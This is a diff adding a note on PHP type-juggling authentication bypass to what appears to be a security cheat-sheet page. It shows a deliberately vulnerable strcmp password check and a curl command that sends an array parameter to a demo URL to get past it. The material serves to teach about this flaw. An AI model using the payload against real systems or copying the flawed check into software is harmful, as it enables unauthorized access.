@@ -158,3 +158,22 @@ params[:user] = { name: 'Evil', email: 'evil@example.com', description: 'I am an
 {% endhighlight %}
 
 
+> **PHP Juggling Authentication**
+
+If 'loose' comparisions are being done, like PHP's == instead of ===, the attacker could possibly abuse this logic:
+
+{% highlight php %}
+<?php
+if (strcmp($_POST['password'], 'sekret') == 0) {
+    echo "Welcome, authorized user!\n";
+} else {
+    echo "Go away, imposter.\n";
+}
+?>
+{% endhighlight %}
+
+Then you may be able to do something like:
+
+{% highlight bash %}
+curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
+Welcome, authorized user!{% endhighlight %}
